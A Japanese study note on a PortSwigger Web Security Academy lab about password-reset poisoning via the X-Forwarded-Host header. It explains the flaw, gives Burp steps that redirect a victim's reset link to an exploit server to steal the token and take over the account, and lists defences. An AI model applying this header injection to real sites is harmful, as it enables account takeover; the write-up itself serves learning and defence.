
Date: 2025-09-26
Tags: 
Links:  [[WSA]], [[Authentication Vulnerabilities]]

***

まとめ
1. パスワード再設定用のURLがメールアドレスに届く。そのURLにはホスト情報がある。`http://<host>/forgot-password?<reset-token>=...
2. →ヘッダを偽造する。
3. `X-Forwarded-Host: exploit-server`とすれば、被害者がリンクを開いたときに攻撃者サーバーにアクセスされ、トークンが手に入る。
**※ホスト名にスキーム名は含まない**


サーバ側のミドルウェアが「メールに書くパスワードリセット用の絶対URL」を **リクエストヘッダー（Host または X-Forwarded-Host）を元に生成している**ため、攻撃者が X-Forwarded-Host を偽装して「リセットリンクのドメイン」を攻撃者管理下のドメインに書き換えさせられる。結果、受信者（被害者）がメールを開いたときにそのリンクにアクセス（またはプレビューでアクセス）してしまい、攻撃者がトークンをログに取得できる、という流れです。

---

# **仕組みを分解して理解する（重要）**

1. アプリはパスワード再設定要求を受けると、**トークンを生成して DB 等に保存**し、ユーザに「絶対URL（例: https://example.com/forgot-password?token=...）」をメールで送る。
    
2. その絶対URLを組み立てる際に、アプリが "Host" ヘッダーや X-Forwarded-Host を参照していると、**そこに書かれたドメインがそのままメール中のリンクに使われる**。
    
3. 攻撃者が X-Forwarded-Host に自分の exploit-server ドメインを入れて POST /forgot-password を送ると、生成されるリセットリンクは攻撃者ドメインを指す（例: https://attacker.exploit-server.net/forgot-password?token=...）。
    
4. メールを受け取った被害者（このラボでは carlos）がメールを開いたりリンクプレビューしたりすると、その攻撃者ドメインへアクセスが来て、攻撃者はリクエストログ（exploit server のアクセスログ）からトークンを盗める。
    

---

# **実際の手順（Burp での操作）※writeup の流れ**

  

（ラボの手順を簡潔に意訳したもの。詳しくはラボページ参照）

1. Burp で POST /forgot-password をキャプチャして Repeater に送る。
    
2. Repeater でヘッダーに X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net を追加する（YOUR-EXPLOIT-SERVER-ID は exploit server のドメイン）。
    
3. リクエストの username パラメータを carlos に変更して送信。
    
    - この送信でサーバは carlos 用の一意トークンを生成してメール送信するが、メール本文に書かれるリンクのドメインは X-Forwarded-Host を参照して攻撃者ドメインになる。
        
    
4. exploit server の **access log** を開くと、メール内のリンク（被害者が開いたことにより）に対する GET /forgot-password?token=... が残っている。そこからトークンをコピーする。
    
5. そのトークンを使い、（writeup の通り）正しいアプリのリセットページの temp-forgot-password-token 値を盗んだトークンで上書きしてロード ⇒ パスワードを再設定。
    
6. そのアカウントでログインすれば完了。
    

  

（重要）攻撃者は「メール中に載っているリンクを攻撃者のドメインに差し替えただけ」で、**トークン自体はサーバが生成した正当なもの**なので有効。攻撃者はそれを傍受すれば不正にアカウントを乗っ取れる。

---

# **なぜ「正規のリセットリンクを取ってきて token を差し替える」必要があるか**

  

ラボの手順では「exploit server に来たリンクからそのままリセットページを開く」ではなく、一旦正規メール中のリンク（本来のドメイン）を利用して temp-forgot-password-token の値のみ差し替える操作をしています。これは実務上よくある理由によるもの：

- 攻撃者が傍受したURLは攻撃者のドメイン（exploit server）なので、そのまま開くとアプリ側で期待されるホスト名やCSRF対策・クッキー条件等により動かなかったり、UI が無い場合がある。
    
- 正規のリセットフォーム（本物のドメイン）に盗んだ「有効なトークン」を入れると、アプリの仕様に沿って安全にパスワード変更ができる（ラボではこのやり方で確実に成功する設計）。
    
    要するに「トークンは有効 → 正しいフォームに差し替えて使えば確実にリセットできる」ためです。
    

---

# **追加で押さえておくと良い点（技術的観察）**

- X-Forwarded-Host が効くのは **サーバ側がそれを「信頼して」URL生成に使っている**から。普通は内部的に使うべき設定値（アプリ設定や環境変数で定義されたホスト）を使うべきで、ヘッダーに依存してはいけない。
    
- メールクライアントがリンクを「事前取得（プレビュー、自動チェック）」する挙動があるため、被害者がリンクをクリックしなくても攻撃者のサーバに GET が残ることがある（このラボはそこを利用している）。
    

---

# **防御策（どう直すべきか）**

  

実務向けの対策を列挙します（理解を深めるためにも重要）：

1. **信頼できる値だけを使う**
    
    - 絶対URLを組み立てるときに Host / X-Forwarded-Host を直接使わず、アプリ設定や正規の公開ドメインを使う（例: APP_BASE_URL を使う）。
        
    
2. **ホストヘッダを信用しない**
    
    - リクエストヘッダー由来のドメインで重要な動作を行わない。
        
    
3. **メールのリンクにトークン以外の追加検証を付ける**
    
    - 受け取ったリセットトークンが生成時のコンテキスト（発行IPやユーザセッション等）と合致するか確認する等。
        
    
4. **ワンタイムで短時間の有効期間**、多要素の導入。
    
5. **Incoming proxies を信頼する設定**
    
    - X-Forwarded-* を読む場合は「どのプロキシから来たリクエストなら信頼するか」を厳密に設定しておく（例: ALB / Cloudflare のみ信頼する）。
        
    

---

# **短いまとめ（復習）**

- X-Forwarded-Host を攻撃者が操作すると、メールに載る「絶対URL」を攻撃者のドメインに差し替えさせられる。
    
- 被害者がメールを開く（または自動プレビュー）すると、その攻撃者ドメインへアクセスが行き、トークンをログで盗める。
    
- トークンを盗んだら正規のリセットフォームに流用してアカウントのパスワードを変更できる。
    

***
# References

https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware